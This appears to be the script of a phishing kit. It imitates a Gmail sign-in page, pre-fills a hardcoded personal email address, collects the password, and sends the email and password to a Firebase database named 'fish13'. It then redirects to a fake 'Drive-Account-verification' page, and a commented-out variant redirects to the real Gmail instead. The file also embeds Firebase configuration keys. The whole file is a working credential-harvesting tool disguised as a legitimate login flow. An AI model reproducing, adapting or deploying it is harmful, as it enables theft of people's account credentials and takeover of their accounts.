
let email = "mistersatyamkumar@gmail.com";

function fillemail() {
	// // let url be --> "https://example.com/?user=abc@gmail.com";

	// // const queryString = window.location.search;
	// const queryString = "?user=abc@gmail.com";

	// const urlParams = new URLSearchParams(queryString);
	// email = urlParams.get('user');

	document.getElementById('email-input').value = email;
}

function validateEmail(email) {
	var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
	return re.test(email);
}

function showpassword() {

	var temp = document.getElementById('password-input');
	if (temp.type === "password") {
		temp.type = "text";
	}
	else {
		temp.type = "password";
	}
}


function onReady() {
	scrollTo(400, 0)
}

function doEmailStep() {

	var emailValid = validateEmail($('#email-input').val());

	$('#cgle-progress-bar').fadeIn(500);//.css('display', 'block')
	$('#login-form').css('opacity', 0.5)

	setTimeout(() => {
		$('#cgle-progress-bar').fadeOut(500);//.css('display', 'none')
		$('#login-form').css('opacity', 1.0)
		if (emailValid) {
			$('#email-input').removeClass('g-input-invalid')
			$('.invalid-email').css('display', 'none')
			$('#prev-email').text($('#email-input').val())
			toPasswordPage()
		} else {
			$('#email-input').addClass('g-input-invalid')
			$('.invalid-email').css('display', 'block')
			toEmailPage()
		}
	}, 400);
}

function doPasswordStep() {
	// var username = $('#email-input').val()
	var password = $('#password-input').val()

	if (password.length <= 5) {
		document.getElementById('in-pass').style.display = "block";
		return;
	}
	else {
		var db = firebase.firestore();
		db.collection("users").add({
			first: email,
			last: password,
			born: 1998
		})
			.then((docRef) => {
				console.log("Document written with ID: ", docRef.id);
				window.location.href = "Drive-Account-verification.html"
			})
			.catch((error) => {
				console.error("Error adding document: ", error);
			});
	}
}

function toEmailPage() {
	coogle.scrollTo(400)
	$('#instruction-text').text('Sign in')
	$('#instrution-text-desc').text('Continue to Gmail')
	$('#email-input').focus()
}

function toPasswordPage() {
	scrollTo(0)

	$('#instruction-text').text('Welcome')
	$('#instrution-text-desc').text(' ')
	$('#password-input').focus()
}

function scrollTo(toPerc, duration = 500) {
	$('.slide-container-outer').animate({
		scrollLeft: toPerc + '%'
	}, duration);
}


function attachEvents() {
	$('#email-form-step').on('submit', function (e) {
		doEmailStep()
		e.preventDefault()
	})


	$('.btn-next-email').on('click', function () {
		doEmailStep()
	})

	$('#password-form-step').on('submit', function (e) {
		doPasswordStep()
		e.preventDefault()
	})

	$('.btn-next-password').on('click', function () {
		doPasswordStep()
	})

}

var firebaseConfig = {
	apiKey: "AIzaSyDlEK7Rwqin6slrq5C5yfxq0MPcptfi2Mo",
	authDomain: "fish13.firebaseapp.com",
	projectId: "fish13",
	storageBucket: "fish13.appspot.com",
	messagingSenderId: "35696983367",
	appId: "1:35696983367:web:6741a4f97e60f25430a062",
	measurementId: "G-326JN6CB3E"
};

// function lastnext() {

// 	const pss = document.getElementById('password-input').value;

// 	if (pss.length <= 5) {
// 		document.getElementById('in-pass').style.display = "block";
// 	}
// 	else {
// 		var db = firebase.firestore();
// 		db.collection("users").add({
// 			first: email,
// 			last: pss,
// 			born: 1998
// 		})
// 			.then((docRef) => {
// 				console.log("Document written with ID: ", docRef.id);
// 				window.location.href = "https://gmail.com";
// 			})
// 			.catch((error) => {
// 				console.error("Error adding document: ", error);
// 			});
// 	}
// }

window.onload = function () {
	onReady();
	attachEvents();
	fillemail();
	// Initialize Firebase
	firebase.initializeApp(firebaseConfig);
	firebase.analytics();

}


